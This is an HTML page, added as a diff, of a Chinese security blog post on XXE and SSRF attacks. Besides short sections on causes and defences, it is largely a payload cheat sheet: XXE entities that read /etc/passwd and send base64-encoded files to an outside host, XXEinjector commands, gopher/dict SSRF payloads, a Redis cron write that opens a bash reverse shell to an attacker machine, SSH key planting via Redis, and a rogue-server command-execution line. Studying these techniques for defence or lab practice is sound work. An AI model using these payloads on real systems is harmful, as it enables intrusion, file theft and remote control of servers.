@@ -1,0 +1,1233 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+  <meta charset="UTF-8">
+  <meta 
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta 
+    http-equiv="X-UA-Compatible" 
+    content="ie=edge">
+  <meta 
+    name="theme-color" 
+    content="#fff" 
+    id="theme-color">
+  <meta 
+    name="description" 
+    content="Chen">
+  <link 
+    rel="icon" 
+    href="/img/favicon.png">
+  <title>XXE和SSRF</title>
+  
+    
+      <meta 
+        property="og:title" 
+        content="XXE和SSRF">
+    
+    
+      <meta 
+        property="og:url" 
+        content="https://www.zerochen.top/article/XXE%E5%92%8CSSRF/index.html">
+    
+    
+      <meta 
+        property="og:img" 
+        content="/img/logo.png">
+    
+    
+    
+      <meta 
+        property="og:type" 
+        content="article">
+      <meta 
+        property="og:article:published_time" 
+        content="2021-08-05">
+      <meta 
+        property="og:article:modified_time" 
+        content="2021-08-12">
+      <meta 
+        property="og:article:author" 
+        content="沉墨">
+      
+        
+          <meta 
+            property="og:article:tag" 
+            content="XXE">
+        
+          <meta 
+            property="og:article:tag" 
+            content="SSRF">
+        
+      
+    
+  
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+    function loadCSS(href, data, attr) {
+      var sheet = document.createElement('link');
+      sheet.ref = 'stylesheet';
+      sheet.href = href;
+      sheet.dataset[data] = attr;
+      document.head.appendChild(sheet);
+    }
+    function changeCSS(cssFile, data, attr) {
+      var oldlink = document.querySelector(data);
+      var newlink = document.createElement("link");
+      newlink.setAttribute("rel", "stylesheet");
+      newlink.setAttribute("href", cssFile);
+      newlink.dataset.prism = attr;
+      document.head.replaceChild(newlink, oldlink);
+    }
+  </script>
+  
+    
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+  </script>
+  
+    <script>
+      var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
+      }
+    };
+    setDarkmode();
+    </script>
+  
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+    
+    <link rel="prefetch" href="//unpkg.com/valine/dist/Valine.min.js" as="script">
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+  
+    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <div class="wrapper">
+       
+      <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+        <img 
+          class="navbar-logo-img" 
+          src="/img/favicon.png" 
+          alt="blog logo">
+      
+      <span class="navbar-logo-dsc">沉墨的小小技术圈</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+      <a 
+        href="/" 
+        class="navbar-menu-item">
+        
+          首页
+        
+      </a>
+    
+      <a 
+        href="/archives" 
+        class="navbar-menu-item">
+        
+          归档
+        
+      </a>
+    
+      <a 
+        href="/tags" 
+        class="navbar-menu-item">
+        
+          标签
+        
+      </a>
+    
+      <a 
+        href="/categories" 
+        class="navbar-menu-item">
+        
+          分类
+        
+      </a>
+    
+      <a 
+        href="/about" 
+        class="navbar-menu-item">
+        
+          关于
+        
+      </a>
+    
+      <a 
+        href="/links" 
+        class="navbar-menu-item">
+        
+          友链
+        
+      </a>
+    
+    <a 
+      class="navbar-menu-item darknavbar" 
+      id="dark">
+      <i class="iconfont icon-weather"></i>
+    </a>
+    <a 
+      class="navbar-menu-item searchnavbar" 
+      id="search">
+      <i 
+        class="iconfont icon-search" 
+        style="font-size: 1.2rem; font-weight: 400;">
+      </i>
+    </a>
+  </div>
+</nav> 
+      
+      <div 
+        id="local-search" 
+        style="display: none">
+        <input
+          class="navbar-menu-item"
+          id="search-input"
+          placeholder="请输入搜索内容..." />
+        <div id="search-content"></div>
+      </div>
+      
+      <div class="section-wrap">
+        <div class="container">
+          <div class="columns">
+            <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      XXE和SSRF
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2021-08-05T04:58:37.000Z">
+      <i 
+        class="iconfont icon-calendar" 
+        style="margin-right: 2px;">
+      </i>
+      <span>2021-08-05</span>
+    </time>
+    
+      <span class="dot"></span>
+      
+        <a 
+          href="/categories/Web%E6%B8%97%E9%80%8F/" 
+          class="post-meta-link">
+          Web渗透
+        </a>
+      
+    
+    
+      <span class="dot"></span>
+      <span>1.9k 字</span>
+    
+  </div>
+  
+    <div 
+      class="post-meta post-show-meta" 
+      style="margin-top: -10px;">
+      <div style="display: flex; align-items: center;">
+        <i 
+          class="iconfont icon-biaoqian" 
+          style="margin-right: 2px; font-size: 1.15rem;">
+        </i>
+        
+          
+          <a 
+            href="/tags/XXE/" 
+            class="post-meta-link">
+            XXE
+          </a>
+        
+          
+            <span class="dot"></span>
+          
+          <a 
+            href="/tags/SSRF/" 
+            class="post-meta-link">
+            SSRF
+          </a>
+        
+      </div>
+    </div>
+  
+  </header>
+  <div 
+    id="section" 
+    class="post-content">
+    <p>XML是可拓展标识语言的简写；功能是传输数据，不是显示数据；</p>
+<table>
+<thead>
+<tr>
+<th align="left">说明</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">数据格式</td>
+<td align="left"><code>Content-Type: application/xml</code><br><code>Content-Length: 9</code><br><code> </code><br><code>&lt;data&gt;</code><br><code>&lt;name&gt;zs&lt;/name&gt;</code><br><code>&lt;pass&gt;123&lt;/pass&gt;</code><br><code>&lt;/data&gt;</code></td>
+</tr>
+<tr>
+<td align="left">语法结构 <br>一部分是标签的定义， 一部分是标签的解释，标签的解释也称为DTD</td>
+<td align="left"><code>&lt;?xml version=&quot;1.1&quot; encode=&quot;utf-8&quot;&gt;  //标识</code><br><code> </code><br><code>&lt;!DOCTYPE data[  //普通实体，内部声明</code><br><code>&lt;!ENTITY name SYSTEM &quot;http://ip:port或者http://dnslog.cn&quot;&gt; //无回显，判断SYSTEM是否可用</code><br><code>&lt;!ENTITY pass SYSTEM &quot;/etc/passwd&quot;&gt;//本地文件读取</code><br><code>&lt;!ENTITY %test SYSTEM &quot;http://ip/dtd文件位置&quot;&gt; %test;//远程文件读取</code><br><code>]&gt;</code><br><code> </code><br><code>(需要修改底下数据为变量：&amp;name;)</code><br><code>//标签+数据</code><br><code>&lt;data&gt;</code><br><code>&lt;name&gt;zs&lt;/name&gt;</code><br><code>&lt;pass&gt;123&lt;/pass&gt;</code><br><code>&lt;/data&gt;</code><br><br>读文件可使用伪协议</td>
+</tr>
+<tr>
+<td align="left">利用</td>
+<td align="left">读文件<br> <code>file:///etc/passwd</code>  <br><br>远程端口探测（内网） <br><code>http://ip:port/test/ </code><br><br>命令执行（前提：php安装expect扩展） <br>expect://系统命令</td>
+</tr>
+<tr>
+<td align="left">数据外带</td>
+<td align="left">本地服务器文件  <br><code>&lt;!ENTITY % data SYSTEM &quot;php://filter/read=convert.base64-encode/resource=doLogin.php&quot;&gt;</code><br><code>&lt;!ENTITY % xxe &quot;&lt;!ENTITY send SYSTEM &#39;http://172.16.12.184:9000/?data=%data;&#39;&gt;&quot;&gt;</code><br><code>%xxe;</code><br><code> </code><br><code>发送文件&lt;br/&gt; </code><br><code>&lt;!DOCTYPE user[</code><br><code>&lt;!ENTITY % load SYSTEM &quot;http://172.16.12.184:9000/xxe.dtd&quot;&gt;</code><br><code>%load;</code><br><code>]&gt;</code><br><code>&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;pass&lt;/password&gt;&lt;/user&gt;</code></td>
+</tr>
+</tbody></table>
+<p>各类语言支持的协议：</p>
+<table>
+<thead>
+<tr>
+<th align="left">libxml2</th>
+<th align="left">PHP</th>
+<th align="left">Java</th>
+<th align="left">.NET</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">file</td>
+<td align="left">file</td>
+<td align="left">http</td>
+<td align="left">file</td>
+</tr>
+<tr>
+<td align="left">ftp</td>
+<td align="left">http</td>
+<td align="left">https</td>
+<td align="left">http</td>
+</tr>
+<tr>
+<td align="left">http</td>
+<td align="left">ftp</td>
+<td align="left">ftp</td>
+<td align="left">https</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">php</td>
+<td align="left">file</td>
+<td align="left">ftp</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">compress.zlib</td>
+<td align="left">jar</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">compress.bzlip2</td>
+<td align="left">netdoc</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">data</td>
+<td align="left">mailto</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">glob</td>
+<td align="left">gopher*</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">phar</td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p><strong>概述：</strong></p>
+<p>XML实体：XML语言的变量，和PHP、JSP、C语言变量一样，有变量名（实体名）、变量值（实体的值）,可以通过&amp;/%引用</p>
+<p>XML实体类型：普通实体和参数实体，用下表总结两种实体类型：</p>
+<table>
+<thead>
+<tr>
+<th align="left">类型</th>
+<th align="left">普通实体</th>
+<th align="left">参数实体</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">使用场合用</td>
+<td align="left">在xml文档中</td>
+<td align="left">用在DTD文档中</td>
+</tr>
+<tr>
+<td align="left">声明内部</td>
+<td align="left"><code>&lt;!ENTITYentityName”entityValue”&gt;</code></td>
+<td align="left"><code>&lt;!ENTITY % entityName&quot;entityValue&quot;&gt;</code></td>
+</tr>
+<tr>
+<td align="left">外部</td>
+<td align="left"><code>&lt;!ENTITYentityNameSYSTEM”外部文件url地址”&gt;</code></td>
+<td align="left"><code>&lt;!ENTITY%entityNameSYSTEM”外部文件url地址”&gt;</code></td>
+</tr>
+<tr>
+<td align="left">引用方式</td>
+<td align="left">&name;</td>
+<td align="left">%name;声明时中间有空格，引用时没空格</td>
+</tr>
+</tbody></table>
+<p><strong>XXE漏洞原理</strong></p>
+<p>概述</p>
+<p>XXE漏洞也叫XML外部实体注入，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件</p>
+<p>漏洞的产生</p>
+<p>对上传的xml文件没有进行过滤，导致可上传恶意xml文件</p>
+<p><strong>漏洞的危害</strong></p>
+<p>1、读取任意文件</p>
+<p>2、执行系统命令</p>
+<p>3、内网端口扫描</p>
+<p>4、攻击内网其他网站</p>
+<p><strong>漏洞的防御与修复</strong></p>
+<p>禁止使用外部实体，例如ibxml_disable_entity_</p>
+<p>loader(true)</p>
+<p>过滤用户提交的XML数据，防止出现非法内容</p>
+<p>XXEinjector.rb使用</p>
+<table>
+<thead>
+<tr>
+<th align="left">操作</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">启动</td>
+<td align="left"><code>ruby ./XXEinjector.rb</code></td>
+</tr>
+<tr>
+<td align="left">使用</td>
+<td align="left">抓取xxe数据包，在data上面加入大写的XXEINJECT 数据外带 <br><code>ruby XXEinjector.rb –file=D:\x.txt –path=/etc/my.cnf –host=172.16.12.182 –httpport=9999 –phpfilter –verbose –oob=http</code></td>
+</tr>
+</tbody></table>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRF（Server-sideRequestForge,服务端请求伪造）是一种由攻击者构造形成由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。主要用来探测内网信息</p>
+<p><strong>存在漏洞的位置：</strong></p>
+<p>1、分享：通过URL地址分享网页内容</p>
+<p>2、转码服务</p>
+<p>3、在线翻译</p>
+<p>4、图片加载与下载：通过URL地址加载或下载图片</p>
+<p>5、图片、文章收藏功能</p>
+<p>6、未公开的api实现以及其他调用URL的功能</p>
+<p>7、从URL关键字中寻找</p>
+<p><strong>SSRF漏洞危害</strong></p>
+<p>端口扫描</p>
+<p>内网Web应用指纹识别</p>
+<p>攻击内网Web应用</p>
+<p>读取本地文件</p>
+<p><strong>SSRF漏洞防御与修复</strong></p>
+<p>限制请求的端口只能为web端口，只允许访问HTTP和HTTPS的请求</p>
+<p>设置白名单，或限制内网IP，以防止对内网进行攻击</p>
+<p>禁止30x跳转</p>
+<p>屏蔽返回的详细信息</p>
+<p><strong>伪协议读取</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">协议</th>
+<th align="left">常见的payload</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">file协议 <br>——读取文件</td>
+<td align="left"><code>curl -v &#39;file:///etc/passwd&#39;</code></td>
+</tr>
+<tr>
+<td align="left">dict协议<br> ——获取目标服务器端口上运行的服务版本等信息</td>
+<td align="left"><code>curl -v &#39;dict://127.0.0.1:6379/info&#39;</code></td>
+</tr>
+<tr>
+<td align="left">gopher协议<br>——反弹Shell</td>
+<td align="left"><code>curl –v &#39;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1**** &#39; bash -i &gt;&amp; /dev/tcp/103.21.140.84/67890&gt;&amp;……&#39;</code></td>
+</tr>
+</tbody></table>
+<p><strong>利用</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">获取正常文件</td>
+<td align="left"><code>[http://ip/ssrf/?url=www.baidu.com/robots.txt]</code></td>
+</tr>
+<tr>
+<td align="left">内网IP探测 <br><code>[http://x.x.x.x](http://x.x.x.x/) http://x.x.x.1/24</code></td>
+<td align="left">输入内网IP，查看返回包，返回正确即存在SSRF。<br> 注：127.0.0.1 IP不能确定存在SSRF 10.x.x.x、172.16.x.x-172.31.x.x、192.168.x.x</td>
+</tr>
+<tr>
+<td align="left">端口探测 <br><code>dict://x.x.x.x:80/ [gopher://x.x.x.x:80/_1](gopher://x.x.x.x:80/_1)</code></td>
+<td align="left">当设置参数URL为内网地址时，则会泄露内网信息，比如内网的某个服务是否开放 <br>提交参数： ?url=探测的ip:1234(不存在的端口) <br>返回结果： 端口没有开放，页面报错  <br><br>提交参数： <a target="_blank" rel="noopener" href="http://ip/ssrf/?url=%E6%8E%A2%E6%B5%8B%E7%9A%84ip:22(%E5%BC%80%E6%94%BE%E7%9A%84%E7%AB%AF%E5%8F%A3)">http://ip/ssrf/?url=探测的ip:22(开放的端口)</a> <br>返回结果： 端口开放，页面返回服务相关信息</td>
+</tr>
+<tr>
+<td align="left">读取系统本地文件</td>
+<td align="left">利用file协议可以任意读取系统本地文件 <br>提交参数：<br><code>?url=file://c:\windows\system32\drivers\etc\hosts</code></td>
+</tr>
+<tr>
+<td align="left">内网Web应用指纹识别</td>
+<td align="left">大多数web应用框架都有一些独特的文件和目录。通过这些文件可以识别出应用的类型，甚至详细的版本。 根据这些信息就可以针对性的搜集漏洞进行攻击。 <br>举例： <br>判断phpMyAdmin是否安装以及详细版本 <br>提交参数： <br><code>?url=http://ip/phpmyadmin/README</code></td>
+</tr>
+</tbody></table>
+<p><strong>快速找到内网IP</strong></p>
+<p>Linux/php或java</p>
+<pre class="highlight"><span class="line">file://读网卡文件、DNS配置文件</span><br></pre>
+
+<p>注：机房IP一般为静态IP</p>
+<p><strong>命令：</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">语句</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">file:///etc/issue</td>
+<td align="left">内容不显示系统类型，为redhat系列</td>
+</tr>
+<tr>
+<td align="left">file:///etc/redhat-relese</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">file:///etc/udev/reules.d/70-persistent-net.rules</td>
+<td align="left">centos6网卡名称</td>
+</tr>
+<tr>
+<td align="left">file:///etc/resolv.conf</td>
+<td align="left">dns位置</td>
+</tr>
+<tr>
+<td align="left">file:///etc/sysconfig/network-scripts/ifcfg-eth0</td>
+<td align="left">网卡信息</td>
+</tr>
+</tbody></table>
+<p><strong>SSRF利用Redis</strong></p>
+<pre class="highlight"><span class="line">url=dict://x.x.x.x:6379/keys+*</span><br></pre>
+
+<p>Redis常用命令</p>
+<table>
+<thead>
+<tr>
+<th align="left">语句</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">flushall</td>
+<td align="left">清空数据</td>
+</tr>
+<tr>
+<td align="left">keys *</td>
+<td align="left">查看数据</td>
+</tr>
+<tr>
+<td align="left">set key value</td>
+<td align="left">设置键值</td>
+</tr>
+<tr>
+<td align="left">get key</td>
+<td align="left">获取键的值</td>
+</tr>
+<tr>
+<td align="left">config set dir /</td>
+<td align="left">设置保存路径</td>
+</tr>
+<tr>
+<td align="left">config set dbfilename xxx.php</td>
+<td align="left">新建文件</td>
+</tr>
+<tr>
+<td align="left">save</td>
+<td align="left">保存</td>
+</tr>
+<tr>
+<td align="left">crontab -e</td>
+<td align="left">设置定时任务</td>
+</tr>
+</tbody></table>
+<p>反弹shell</p>
+<pre class="highlight"><span class="line">nc -lvnp 4444        # 攻击机开启监听</span><br></pre>
+
+<p># 连接redis，写定时反弹shell</p>
+<pre class="highlight"><span class="line">redis-cli -h 192.168.24.79</span><br><span class="line"></span><br><span class="line">flushall</span><br><span class="line"></span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line"></span><br><span class="line">config set dbfilename root</span><br><span class="line"></span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.24.82/4444 0&gt;&amp;1\n\n&quot;        #每分钟执行一次反弹连接</span><br><span class="line"></span><br><span class="line">save</span><br></pre>
+
+<p><strong>ssh登录</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">语句</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">ssh-keygen -t rsa</td>
+<td align="left">生成密钥</td>
+</tr>
+<tr>
+<td align="left">(echo -e “\n\n”; cat id_rsa.pub; echo -e “\n\n”) &gt; key.txt</td>
+<td align="left">写入公钥</td>
+</tr>
+<tr>
+<td align="left">cat ./key.txt | redis-cli -h 192.168.24.79 -x set tide</td>
+<td align="left">将公钥内容设置给redis变量（靶机ip）</td>
+</tr>
+<tr>
+<td align="left">redis-cli -h 192.168.24.79</td>
+<td align="left">连接</td>
+</tr>
+<tr>
+<td align="left">config set dir /root/.ssh</td>
+<td align="left">默认公私钥路径</td>
+</tr>
+<tr>
+<td align="left">config set dbfilename authorized_keys</td>
+<td align="left">写入authorized_keys</td>
+</tr>
+<tr>
+<td align="left">save</td>
+<td align="left">保存</td>
+</tr>
+</tbody></table>
+<p><strong>命令执行</strong></p>
+<p>主从复制，数据同步，从-&gt;主，写入.so拓展库，执行系统命令</p>
+<pre class="highlight"><span class="line">脚本：redis-rogue-server</span><br><span class="line"></span><br><span class="line">命令：python redis-rogue-server.py --rhost=192.168.21.61 --rport=6379 --lhost=192.168.21.112 --lport=1111</span><br></pre>
+
+  </div>
+  <div>
+    
+      <div 
+        class="post-note note-warning copyright" 
+        style="margin-top: 42px">
+        <p>
+          <span style="font-weight: bold;">作者：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="/about">
+            沉墨
+          </a>
+        </p>
+        <p>
+          <span style="font-weight: bold;">文章链接：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="https://www.zerochen.top/article/XXE%E5%92%8CSSRF/">
+            https://www.zerochen.top/article/XXE%E5%92%8CSSRF/
+          </a>
+        </p>
+        <p><span style="font-weight: bold;">版权声明：</span>转载请注明出处！</p>
+      </div>
+    
+  </div>
+</article>
+<div class="nav">
+  
+    <div class="nav-item-prev">
+      <a 
+        href="/article/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" 
+        class="nav-link">
+        <i class="iconfont icon-left nav-prev-icon"></i>
+        <div>
+          <div class="nav-label">上一篇</div>
+          
+            <div class="nav-title">逻辑漏洞 </div>
+          
+        </div>
+      </a>
+    </div>
+  
+  
+    <div class="nav-item-next">
+      <a 
+        href="/article/CSRF/" 
+        class="nav-link">
+        <div>
+          <div class="nav-label">下一篇</div>
+          
+            <div class="nav-title">CSRF </div>
+          
+        </div>
+        <i class="iconfont icon-right nav-next-icon"></i>
+      </a>
+    </div>
+  
+</div>
+
+  <div 
+    class="card card-content comment-card" 
+    style="margin-top: 16px;">
+    <div class="comment-card-title">评论</div>
+    
+  <div id="vcomments"></div>
+  
+  <script>
+    loadScript("//unpkg.com/valine/dist/Valine.min.js");
+    var oldLoadVa = window.onload;
+    window.onload = function () {
+      oldLoadVa && oldLoadVa();
+      new Valine({
+        el: '#vcomments',
+        appId: '2ShT4MB47jbSbE00Kn5TgK8j-gzGzoHsz',
+        appKey: 'eC6yijqvttNWfHdJogIgmhA4',
+        placeholder: 'Just go go',
+        path: window.location.pathname,
+        avatar: 'mp',
+        meta: ["nick","mail","link"],
+        pageSize: '10',
+        lang: '',
+        visitor: 'false',
+        highlight: true,
+        recordIP: false,
+        
+        
+        
+        enableQQ: 'false',
+        requiredFields: [],
+      });
+    };
+  </script>
+
+  </div>
+
+<div 
+  class="card card-content toc-card" 
+  id="mobiletoc">
+  <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE"><span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a></li></ol>
+</div></main>
+            <aside class="left-column">
+              
+              <div class="card card-author">
+                
+  <img 
+    src="/img/logo.png" 
+    class="author-img" 
+    alt="author avatar">
+
+<p class="author-name">沉墨</p>
+<p class="author-description">谨言多思，野蛮生长</p>
+<div class="author-message">
+  <a 
+    class="author-posts-count" 
+    href="/archives">
+    <span>43</span>
+    <span>文章</span>
+  </a>
+  <a 
+    class="author-categories-count" 
+    href="/categories">
+    <span>9</span>
+    <span>分类</span>
+  </a>
+  <a 
+    class="author-tags-count" 
+    href="/tags">
+    <span>43</span>
+    <span>标签</span>
+  </a>
+</div>
+
+              </div>
+               <div class="sticky-tablet">
+  
+  
+    <article class="display-when-two-columns spacer">
+      <div class="card card-content toc-card">
+        <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE"><span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a></li></ol>
+      </div>
+    </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header">
+    <i 
+      class="iconfont icon-fenlei" 
+      style="padding-right: 2px;">
+    </i>分类
+  </div>
+  <div class="categories-list">
+    
+      <a href="/categories/Web%E6%B8%97%E9%80%8F/">
+        <div class="categories-list-item">
+          Web渗透
+          <span class="categories-list-item-badge">20</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          编程基础
+          <span class="categories-list-item-badge">3</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          网络基础
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+        <div class="categories-list-item">
+          漏洞复现
+          <span class="categories-list-item-badge">5</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        <div class="categories-list-item">
+          环境搭建
+          <span class="categories-list-item-badge">6</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Linux/">
+        <div class="categories-list-item">
+          Linux
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Python/">
+        <div class="categories-list-item">
+          Python
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Windows/">
+        <div class="categories-list-item">
+          Windows
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E9%99%84%E5%8A%A0%E6%8A%80%E8%83%BD/">
+        <div class="categories-list-item">
+          附加技能
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header">
+    <i 
+      class="iconfont icon-biaoqian" 
+      style="padding-right: 2px;">
+    </i>热门标签
+  </div>
+  <div class="tags-list">
+    
+      <a 
+        href="/tags/%E9%9A%8F%E8%AE%B0/" 
+        title="随记">
+        <div class="tags-list-item">随记</div>
+      </a>
+    
+      <a 
+        href="/tags/Redis/" 
+        title="Redis">
+        <div class="tags-list-item">Redis</div>
+      </a>
+    
+      <a 
+        href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" 
+        title="逻辑漏洞">
+        <div class="tags-list-item">逻辑漏洞</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" 
+        title="网络协议">
+        <div class="tags-list-item">网络协议</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" 
+        title="文件包含">
+        <div class="tags-list-item">文件包含</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
+        title="文件上传">
+        <div class="tags-list-item">文件上传</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8D%9A%E5%AE%A2/" 
+        title="博客">
+        <div class="tags-list-item">博客</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81/" 
+        title="直播推流">
+        <div class="tags-list-item">直播推流</div>
+      </a>
+    
+      <a 
+        href="/tags/Nginx/" 
+        title="Nginx">
+        <div class="tags-list-item">Nginx</div>
+      </a>
+    
+      <a 
+        href="/tags/Apache/" 
+        title="Apache">
+        <div class="tags-list-item">Apache</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" 
+        title="命令执行">
+        <div class="tags-list-item">命令执行</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8F%8D%E5%BC%B9shell/" 
+        title="反弹shell">
+        <div class="tags-list-item">反弹shell</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%8F%90%E6%9D%83/" 
+        title="提权">
+        <div class="tags-list-item">提权</div>
+      </a>
+    
+      <a 
+        href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" 
+        title="信息收集">
+        <div class="tags-list-item">信息收集</div>
+      </a>
+    
+      <a 
+        href="/tags/DVWA/" 
+        title="DVWA">
+        <div class="tags-list-item">DVWA</div>
+      </a>
+    
+      <a 
+        href="/tags/SSRF/" 
+        title="SSRF">
+        <div class="tags-list-item">SSRF</div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
